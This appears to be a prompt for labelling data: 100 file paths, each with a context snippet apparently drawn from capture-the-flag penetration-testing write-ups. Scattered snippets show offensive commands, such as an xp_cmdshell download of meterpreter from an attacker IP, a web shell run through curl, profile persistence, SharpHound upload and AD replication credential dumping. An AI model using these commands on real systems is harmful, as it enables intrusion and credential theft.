@@ -1,0 +1,203 @@
+Label these 100 paths (chunk 1/15).
+Reply with one jsonl code block, one record per path, in input order.
+
+1. /home/paul/.foundry/bin/forge
+   context: ck ~]$ sudo -l User keira may run the following commands on blockblock:     (paul : paul) NOPASSWD: /home/paul/.foundry/bin/forge
+2. /BOOT-INF/classes/static/assets/vendor/remixicon/remixicon.symbol.svg
+   context: <p th:if="${param.error}" class="text-center small">Invalid username or password</p> ./BOOT-INF/classes/static/assets/vendor/remixicon/remixicon.symbol.svg:</symbol><symbol viewBox="0 0 24 24" id="ri-
+3. C:\Get-bADpasswords\run.vbs
+   context: c "$sh = New-Object -ComObject WScript.Shell; $sh.CreateShortcut('.\bAD Passwords.lnk').TargetPath" C:\Get-bADpasswords\run.vbs
+4. /usr/sbin/CRON
+   context: 2026/02/10 11:30:01 CMD: UID=0     PID=681830 | /usr/sbin/CRON -f -P  2026/02/10 11:30:01 CMD: UID=0     PID=681831 |  2026/02/10 11:30:01 CMD: UID=0     PID=6818
+5. /tmp/nginx.conf
+   context: activemq@broker:/tmp$ sudo /usr/sbin/nginx -c /tmp/nginx.conf  activemq@broker:/tmp$ netstat -tnlp | grep 1339 tcp        0      0 0.0.0.0:1339            0.0.0.
+6. /usr/sbin/dpkg
+   context: +RUN rm -rf /var/lib/apt/lists/* /etc/apt/sources.list* /usr/bin/apt-get /usr/bin/apt /usr/bin/dpkg /usr/sbin/dpkg /usr/bin/dpkg-deb /usr/sbin/dpkg-deb + +# Wait for the db to be ready first +COPY wai
+7. C:\Windows\TEMP\
+   context: bject 2025-05-16 23:05:23, Info                  DISM   PID=3580 TID=4348 Scratch directory set to 'C:\Windows\TEMP\'. - CDISMManager::put_ScratchDir 2025-05-16 23:05:23, Info                  DISM   
+8. C:\Windows\SYSVOL\domain\scripts\A32FF3AEAA23
+   context: dows\Registration\CRMLog  W C:\Windows\System32\Tasks RW C:\Windows\System32\spool\drivers\color RW C:\Windows\SYSVOL\domain\scripts\A32FF3AEAA23 RW C:\Windows\SYSVOL\domain\scripts\A32FF3AEAA23\113EB
+9. /opt/bitnami/common/bin
+   context: ASE_SSL=yes OS_NAME=linux BETA_VINO_WP_WORDPRESS_PORT_80_TCP_PROTO=tcp PATH=/opt/bitnami/apache/bin:/opt/bitnami/common/bin:/opt/bitnami/common/bin:/opt/bitnami/mysql/bin:/opt/bitnami/common/bin:/opt/
+10. /usr/bin/perl
+   context: /11/07 23:09:27 CMD: UID=113   PID=6766   | locale  2023/11/07 23:09:32 CMD: UID=113   PID=6768   | /usr/bin/perl /usr/bin/psql  2023/11/07 23:09:32 CMD: UID=113   PID=6769   | /bin/bash /usr/bin/ldd 
+11. /opt/tomcat/bin/startup.sh
+   context: Environment='JAVA_OPTS=-Djava.awt.headless=true -Djava.security.egd=file:/dev/./urandom'  ExecStart=/opt/tomcat/bin/startup.sh ExecStop=/opt/tomcat/bin/shutdown.sh  User=tomcat Group=tomcat UMask=0007
+12. /root/TeamCity/buildAgent/lib/common-config.jar
+   context: /log4j-api.jar:/root/TeamCity/buildAgent/lib/utils.jar:/root/TeamCity/buildAgent/lib/common-vcs.jar:/root/TeamCity/buildAgent/lib/common-config.jar:/root/TeamCity/buildAgent/lib/plugin-model-common.ja
+13. /var/lib/docker/overlay2/l/YWET34PNBXR53LJY2XX7ZIXHLS
+   context: docker/overlay2/l/XKE4ZK5GJUTHXKVYS4MQMJ3NOB:/var/lib/docker/overlay2/l/ 3JPYTR54WWK2EX6DJ7PMMAVPQQ:/var/lib/docker/overlay2/l/YWET34PNBXR53LJY2XX7ZIXHLS:/var/lib/docker/overlay2/l/IM3MC55GS7JDB4D2EYT
+14. /var/lib/postgresql/.profile
+   context: wesley@download:~$ echo -e "\n\npython /dev/shm/poc.py\n" >> /var/lib/postgresql/.profile -bash: /var/lib/postgresql/.bashrc: Permission denied
+15. /usr/local/bin/genlabel
+   context: \:/sbin\:/bin\:/snap/bin  User neil may run the following commands on bookworm:     (ALL) NOPASSWD: /usr/local/bin/genlabel
+16. /zabbix/index.php
+   context: /zabbix/index.php
+17. /opt/security/lib/RandomForestClassifier.sav
+   context: ecurity/lib/GaussianNB.sav'              f4 = '/opt/security/lib/KNeighborsClassifier.sav'    f5 = '/opt/security/lib/RandomForestClassifier.sav'  f6 = '/opt/security/lib/MLPClassifier.sav'
+18. C:\Users
+   context: C:\Users
+19. C:\Programdata\0xdf-transcript.txt
+   context: Start-Transcript -Path 'C:\Programdata\0xdf-transcript.txt' Get-ADReplAccount -SamAccountName administrator -Server 'hathor.windcorp.htb' Stop-Transcript
+20. /dev/shm/0xdf.tar
+   context: lopez@intuition:/dev/shm$ echo '{"run": {"action": "install", "role_file": "/dev/shm/0xdf.tar"}, "auth_code": "UHI75GHINKOP"}' > 0xdf.json lopez@intuition:/dev/shm$ sudo /opt/runner2/runner2 0x
+21. /etc/init.d
+   context: /etc/init.d
+22. C:\Windows\SYSVOL\domain\scripts\A32FF3AEAA23\113EB3B0B2D3\0EEB3FED3C10\EA1EBECD3ADA
+   context: 12102303 RW C:\Windows\SYSVOL\domain\scripts\A32FF3AEAA23\113EB3B0B2D3\0EEB3FED3C10\DE3FC3AD20F0 RW C:\Windows\SYSVOL\domain\scripts\A32FF3AEAA23\113EB3B0B2D3\0EEB3FED3C10\EA1EBECD3ADA ...[snip]...
+23. /home/smorton
+   context: www-data@investigation:/$ ls /home/ smorton www-data@investigation:/$ cd /home/smorton/ bash: cd: /home/smorton/: Permission denied
+24. /var/www/.cache/google-chrome-for-testing/Default/Cache/old_Cache_Data_040
+   context: file or directory (2) [2415:2418:0309/174909.483596:VERBOSE1:file_util_posix.cc(315)] Cannot stat "/var/www/.cache/google-chrome-for-testing/Default/Cache/old_Cache_Data_040": No such file or director
+25. /tmp/config.json
+   context: 0 write(1, "Satellite Tracking System\n", 26Satellite Tracking System ) = 26 newfstatat(AT_FDCWD, "/tmp/config.json", 0x7ffce5ff34c0, 0) = -1 ENOENT (No such file or directory) write(1, "Configuration
+26. /furni.htb/static/images/blogs/3.jpg
+   context: 826c http://furni.htb/static/css/bootstrap.min.css 200      GET      734l     4989w   510519c http://furni.htb/static/images/blogs/3.jpg 200      GET      466l     2775w   216716c http://furni.htb/sta
+27. C:\Windows\System32\sihost.exe
+   context: Windows\System32\svchost.exe  380   2980  sihost.exe               x64   1        HOSPITAL\drbrown  C:\Windows\System32\sihost.exe  688   656   svchost.exe              x64   1        HOSPITAL\drbrown
+28. /var/lib/ghost/config.production.json
+   context: kerfile.ghost @@ -0,0 +1,16 @@ +FROM ghost:5.58.0 + +# Copy the config +COPY config.production.json /var/lib/ghost/config.production.json + +# Prevent installing packages +RUN rm -rf /var/lib/apt/list
+29. C:\Users\PPotts\AppData\Roaming\Microsoft\Protect\S-1-5-21-1199398058-4196589450-691661856-1107
+   context: rce AppData\Roaming\Microsoft\Protect\S-1-5-21-1199398058-4196589450-691661856-1107      Directory: C:\Users\PPotts\AppData\Roaming\Microsoft\Protect\S-1-5-21-1199398058-4196589450-691661856-1107  Mod
+30. C:\Windows\Temp\hMailServerUpgraded.sdf
+   context: Source=C:\Windows\Temp\hMailServer.sdf;Password=95C02068FD5D") PS C:\> $engine.Upgrade("Data Source=C:\Windows\Temp\hMailServerUpgraded.sdf")  PS C:\> ls C:\Windows\Temp\hMailServerUpgraded.sdf      D
+31. /var/www/.cache/google-chrome-for-testing/Default/Cache/old_Cache_Data_095
+   context: file or directory (2) [2415:2418:0309/174909.489462:VERBOSE1:file_util_posix.cc(315)] Cannot stat "/var/www/.cache/google-chrome-for-testing/Default/Cache/old_Cache_Data_095": No such file or director
+32. C:\Windows\SystemApps\Microsoft.Windows.Cortana_cw5n1h2txyewy\SearchUI.exe
+   context: Windows\System32\dllhost.exe  7176  892   SearchUI.exe             x64   1        HOSPITAL\drbrown  C:\Windows\SystemApps\Microsoft.Windows.Cortana_cw5n1h2txyewy\SearchUI.exe  7260  892   RuntimeBroke
+33. C:\Windows\System32\com\dmp
+   context: n\CRMLog:*" /><FilePathCondition Path="C:\Windows\Registration\CRMLog\*" /><FilePathCondition Path="C:\Windows\System32\com\dmp:*" /><FilePathCondition Path="C:\Windows\System32\com\dmp\*" /><FilePath
+34. /opt/SecLists/Discovery/SNMP/snmp.txt
+   context: oxdf@hacky$ onesixtyone -c /opt/SecLists/Discovery/SNMP/snmp.txt 10.129.244.98 Scanning 1 hosts, 3219 communities 10.129.244.98 [public] "The default consultant pas
+35. /include/admin-page/addon/csv-export/index.php
+   context: _key'); ./include/admin-page/addon/csv-import/index.php:    $qry  = get_option('pms_encrypt_key'); ./include/admin-page/addon/csv-export/index.php:                                        $qry  = get_o
+36. C:\programdata\ca.pfx
+   context: inRM* PS C:\programdata> download ca.pfx                                          Info: Downloading C:\programdata\ca.pfx to ca.pfx                                          Info: Download successful!
+37. /Sommerregen/grav-theme-aerial/zipball/v2.0.4
+   context: /Aug/2025 22:33:23] code 404, message File not found 10.129.234.211 - - [29/Aug/2025 22:33:23] "GET /Sommerregen/grav-theme-aerial/zipball/v2.0.4 HTTP/1.1" 404 -
+38. /usr/libexec/udisks2/udisksd
+   context: 0:00 /lib/systemd/systemd-logind root         848  0.0  0.3 392540 12796 ?        Ssl  12:20   0:00 /usr/libexec/udisks2/udisksd root         879  0.0  0.3 318004 12584 ?        Ssl  12:20   0:00 /usr
+39. /home/enzo
+   context: anning:~$ cat /etc/passwd | grep 'sh$' root:x:0:0:root:/root:/bin/bash enzo:x:1000:1000:Enzo Yamada:/home/enzo:/bin/bash
+40. /usr/bin/suricata
+   context: tuition:~$ ps auxww ...[snip]... root        1337  8.8  2.9 548512 115900 ?       Ssl  14:48  29:12 /usr/bin/suricata -D --af-packet -c /etc/suricata/suricata.yaml --pidfile /run/suricata.pid ...[snip
+41. /etc/default/haproxy
+   context: k-online.target rsyslog.service     Wants=network-online.target      [Service]     EnvironmentFile=-/etc/default/haproxy     EnvironmentFile=-/etc/sysconfig/haproxy     Environment="CONFIG=/etc/haprox
+42. /usr/bin/date
+   context: #!/bin/bash  date=$(/usr/bin/date +"%FT%H%M") /usr/bin/rm -rf /opt/backups/current/* /usr/bin/pg_basebackup -h /var/run/postgresql -U
+43. /app.microblog.htb/brain.png
+   context: 306w     3976c http://app.microblog.htb/index.php 200      GET     1308l     8063w   731222c http://app.microblog.htb/brain.png 200      GET       83l      306w     3976c http://app.microblog.htb/ 302
+44. C:\Users\steph.cooper\appdata\Roaming\Microsoft\Protect\S-1-5-21-1487982659-1829050783-2281216199-1107
+   context: *Evil-WinRM* PS C:\Users\steph.cooper\appdata\Roaming\Microsoft\Protect\S-1-5-21-1487982659-1829050783-2281216199-1107> ls -force      Directory: C:\Users\steph.cooper\appdata\Roaming\Microsoft\Protec
+45. C:\windows\system32\drivers\etc\hosts
+   context: C:\windows\system32\drivers\etc\hosts
+46. C:\programdata\s.exe
+   context: /certificate-10.10.11.71/SharpHound.exe: 1.25MB [00:04, 292kB/s] [+] File uploaded successfully as: C:\programdata\s.exe evil-winrm-py PS C:\programdata> .\s.exe -c all --ZipFileName bh.zip 2025-06-06
+47. /var/www/cat.htb
+   context: process group (978): Inappropriate ioctl for device bash: no job control in this shell www-data@cat:/var/www/cat.htb$
+48. \\r\ndir\r\ncd
+   context: ile "C:\\Windows\\Tasks\\SQL2022-SSEI-Expr.exe"\r\nC:\\Windows\\Tasks\\SQL2022-SSEI-Expr.exe\r\ncd \\\r\ndir\r\ncd .\\SQL2022\\\r\ndir\r\ncd .\\Evaluation_ENU\\\r\ndir\r\n.\\SETUP.EXE /ACTION=Install\
+49. /home/oscar190
+   context: eureka:/home$ cat /etc/passwd | grep 'sh$' root:x:0:0:root:/root:/bin/bash oscar190:x:1000:1001:,,,:/home/oscar190:/bin/bash miranda-wise:x:1001:1002:,,,:/home/miranda-wise:/bin/bash
+50. /data/scripts
+   context: /data/scripts
+51. C:\Windows\System32\spool\drivers\color
+   context: ndows\Tasks RW C:\Windows\tracing RW C:\Windows\Registration\CRMLog  W C:\Windows\System32\Tasks RW C:\Windows\System32\spool\drivers\color RW C:\Windows\SYSVOL\domain\scripts\A32FF3AEAA23 RW C:\Windo
+52. C:\Users\Helen.Frost\desktop
+   context: evil-winrm-py PS C:\Users\Helen.Frost\desktop> cat user.txt 57c60164************************
+53. /src/argon.ts
+   context: module.exports = {   mode: "development",   devtool: "source-map",   entry: {     argon: "./src/argon.ts",     background: "./src/background.ts",     content: "./src/content.ts",     popup: "./src/pop
+54. /tmp/test
+   context: a test" > /tmp/test.txt frank@bookworm:/home/neil/converter/calibre$ ./ebook-convert /tmp/test.txt /tmp/test 1% Converting input to HTML... InputFormatPlugin: TXT Input running on /tmp/test.txt Langua
+55. /usr/local/nagiosxi/scripts/reset_config_perms.sh
+   context: ezone.sh     (root) NOPASSWD: /usr/local/nagiosxi/scripts/manage_services.sh *     (root) NOPASSWD: /usr/local/nagiosxi/scripts/reset_config_perms.sh     (root) NOPASSWD: /usr/local/nagiosxi/scripts/m
+56. /restricted/about.html
+   context: /restricted/about.html
+57. /provision/cron/root/otp-generator
+   context: /provision/cron/root/otp-generator
+58. /home/mtz
+   context: tz www-data@permx:/home$ grep 'sh$' /etc/passwd root:x:0:0:root:/root:/bin/bash mtz:x:1000:1000:mtz:/home/mtz:/bin/bash
+59. C:\Windows\Temp\rev.exe
+   context: s\System32\RuntimeBroker.exe  7556  2016  rev.exe                  x64   0        HOSPITAL\drbrown  C:\Windows\Temp\rev.exe  7624  3452  iexplore.exe             x86   1        HOSPITAL\drbrown  C:\Pr
+60. C:\Users\f.frizzle
+   context: oxdf@hacky$ ssh -k f.frizzle@frizzdc.frizz.htb PowerShell 7.4.5 PS C:\Users\f.frizzle>
+61. /var/www/forum
+   context: .         ServerAdmin webmaster@localhost         ServerName forum.collect.htb         DocumentRoot /var/www/forum/ ...[snip]...          ErrorLog ${APACHE_LOG_DIR}/error.log         CustomLog ${APACH
+62. /opt/site.new/wp-content/plugins/brandfolder/callback.php
+   context: /opt/site.new/wp-content/plugins/brandfolder/callback.php
+63. /etc/haproxy/errors/502.http
+   context: xy/errors/408.http             errorfile 500 /etc/haproxy/errors/500.http             errorfile 502 /etc/haproxy/errors/502.http             errorfile 503 /etc/haproxy/errors/503.http             erro
+64. \\localhost\pipe\oxdf
+   context: True            localhost             $pipe.Listen()   PS C:\programdata\2.0.1> $file = Get-NtFile \\localhost\pipe\oxdf -Win32Path PS C:\programdata\2.0.1> $token = Use-NtObject($pipe.Impersonate()) 
+65. /usr/local/scripts/../../../dev/shm/0xdf.js
+   context: angoose@stocker:~$ sudo node /usr/local/scripts/../../../dev/shm/0xdf.js  angoose@stocker:~$ ls -l /tmp/0xdf  -rwsrwxrwx 1 root root 1183448 Jun 12 16:56 /tmp/0xdf
+66. /home/oxdf/.gnupg/pubring.kbx
+   context: oxdf@hacky$ gpg --list-keys /home/oxdf/.gnupg/pubring.kbx ----------------------------- pub   rsa3072 2023-11-14 [SC] [expires: 2025-11-13]       475BDF4B09A
+67. /../shell.jsp
+   context: ../../shell.jsp
+68. Z:\hackthebox\infiltrator-10.10.11.31
+   context: PS Z:\hackthebox\infiltrator-10.10.11.31 > .\UserExplorer.exe Usage: UserExplorer.exe -u <username> -p <password>  -s <searchedUsername> [-d
+69. C:\programdata\m.exe
+   context: 01_sql_svc  dbo@master)> xp_cmdshell "powershell -c IWR http://10.10.14.61/meterpreter.exe -outfile C:\programdata\m.exe" output    ------    NULL   SQL >[DC02.darkzero.ext] (dc01_sql_svc  dbo@master)
+70. C:\Users\support\desktop
+   context: *Evil-WinRM* PS C:\Users\support\desktop> type user.txt 93ca1fe7************************
+71. /var/lib/consul
+   context: May13   9:08 /usr/local/bin/consul agent -server -ui -advertise=127.0.0.1 -bind=127.0.0.1 -data-dir=/var/lib/consul -node=consul-01 -config-dir=/etc/consul.d ...[snip]...
+72. /var/www/html/public
+   context: server {     listen 80;     server_name cybermonday.htb;     root /var/www/html/public;      index index.php index.html index.htm;      location / {         try_files $uri $uri/ /index.p
+73. C:\Users\dallon.matrix\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine
+   context: PS C:\Users\dallon.matrix\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine> ls      Directory: C:\Users\dallon.matrix\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine
+74. /daloradius/app/operators/login.php
+   context: /daloradius/app/operators/login.php
+75. /dev/shm/TRICKSTER.gcode
+   context: ng supports. Also consider enabling brim. 88 => Generating skirt and brim 90 => Exporting G-code to /dev/shm/TRICKSTER.gcode
+76. /srv/ten-299467c0
+   context: n-13e92a74/ </VirtualHost>   <VirtualHost *:80>         ServerName oxdf.ten.vl         DocumentRoot /srv/ten-299467c0/ </VirtualHost>   <VirtualHost *:80>                                      ServerNa
+77. C:\$RECYCLE.BIN
+   context: C:\$RECYCLE.BIN
+78. /installation_scripts/install_jenkins.sh
+   context: cripts/install_flask.sh:        proxy_pass http://unix:/home/$username/public_html/$username.sock; ./installation_scripts/install_jenkins.sh:    echo -e "\n\nJenkins installation is complete.\nAccess 
+79. /usr/local/share/race-scripts/backup
+   context: max@race:~$ find / -group racers 2>/dev/null /usr/local/share/race-scripts /usr/local/share/race-scripts/backup /usr/local/share/race-scripts/backup/offsite-backup.sh
+80. /backup/home_backup/home/reader/.google_authenticator
+   context: oxdf@hacky$ uv run filters_chain_oracle_exploit.py --verb PUT --file /backup/home_backup/home/reader/.google_authenticator --target http://checker.htb/ajax/page/8/save-draft --parameter html --headers
+81. /certificate.htb/header.php
+   context: atic/fonts => http://certificate.htb/static/fonts/ 200      GET       46l      106w     1848c http://certificate.htb/header.php 200      GET       71l      231w     2955c http://certificate.htb/footer
+82. C:\Users\sflowers\Documents
+   context: 2BDA14DB5  Evil-WinRM shell v3.4  Info: Establishing connection to remote endpoint  *Evil-WinRM* PS C:\Users\sflowers\Documents>
+83. C:\Users\john\desktop
+   context: evil-winrm-py PS C:\Users\john\desktop> cat user.txt bc7fc5d3************************
+84. C:\Users\localadmin\Desktop
+   context: C:\Users\localadmin\Desktop>type root.txt 59248161************************
+85. /.local/share/pipx/venvs/pyaescrypt
+   context: ~/.local/share/pipx/venvs/pyaescrypt
+86. C:\Users\C.Bum\Desktop
+   context: C:\Users\C.Bum\Desktop>type user.txt ac9c5426************************
+87. /home/deploy/creds.txt
+   context: system("cat /home/deploy/creds.txt")
+88. C:\Users\mark.adams\Documents
+   context: ▌ ▄▌ v1.1.1 [*] Connecting to haze.htb:5985 as mark.adams evil-winrm-py PS C:\Users\mark.adams\Documents>
+89. /tmp/zm/zm-10.dump
+   context: mp/zm if you have a lot of events. Press 'y' for a backup or 'n' to continue : y Creating backup to /tmp/zm/zm-10.dump. This may take several minutes. root@surveillance:/usr/bin#
+90. /app/config_test.json
+   context: use_pty  User edwards may run the following commands on agile:     (dev_admin : dev_admin) sudoedit /app/config_test.json     (dev_admin : dev_admin) sudoedit /app/app-testing/tests/functional/creds.t
+91. /home/node/.bash_history
+   context: FROM ghost:5-alpine  RUN ln -s /dev/null /root/.bash_history RUN ln -s /dev/null /home/node/.bash_history  RUN mkdir /var/lib/ghost/extra RUN echo 659cdeec9cd6330001baefbf > /var/lib/ghost/extra/impor
+92. /var/../root/.bash_history
+   context: /motd.legal-displayed /var/../root/.ssh/ /var/../root/.ssh/id_rsa /var/../root/.ssh/authorized_keys /var/../root/.bash_history /var/../root/.bashrc
+93. /var/log/lverifier.log
+   context: /var/log/lverifier.log
+94. C:\Users\Administrator\Documents\copy.ps1
+   context: C:\Users\Administrator\Documents\copy.ps1
+95. /clicker.htb/index.php
+   context: cker.htb/info.php 302      GET        0l        0w        0c http://clicker.htb/export.php => http://clicker.htb/index.php 301      GET        9l       28w      315c http://clicker.htb/assets/css => h
+96. /target/classes/com/eureka/Furni/Model/User.class
+   context: curity/WebSecurityConfig.class ./target/classes/com/eureka/Furni/Security/LoginSuccessLogger.class ./target/classes/com/eureka/Furni/Model/User.class ./target/classes/com/eureka/Furni/Service/CustomUs
+97. C:\$RECYCLE.BIN\S-1-5-21-2386970044-1145388522-2932701813-1103\$RE2XMEG.7z
+   context: m.__ComObject Parent       : System.__ComObject Name         : wapt-backup-sunday.7z Path         : C:\$RECYCLE.BIN\S-1-5-21-2386970044-1145388522-2932701813-1103\$RE2XMEG.7z GetLink      :  GetFolder
+98. /sea.htb/themes/theme223/cmd.php
+   context: oxdf@hacky$ curl http://sea.htb/themes/theme223/cmd.php?cmd=id uid=33(www-data) gid=33(www-data) groups=33(www-data)
+99. C:\Users\Helen.Frost\Documents
+   context: ▌ ▄▌ v1.1.2 [*] Connecting to dc.redelegate.vl:5985 as helen.frost evil-winrm-py PS C:\Users\Helen.Frost\Documents>
+100. /previous.htb/_next/static/chunks/webpack-cb370083d4f9953f.js
+   context: ext/static/-ipsiOtEey-zESpHzrwmc/_buildManifest.js 200      GET        1l       60w     3028c http://previous.htb/_next/static/chunks/webpack-cb370083d4f9953f.js 200      GET        1l      283w     5
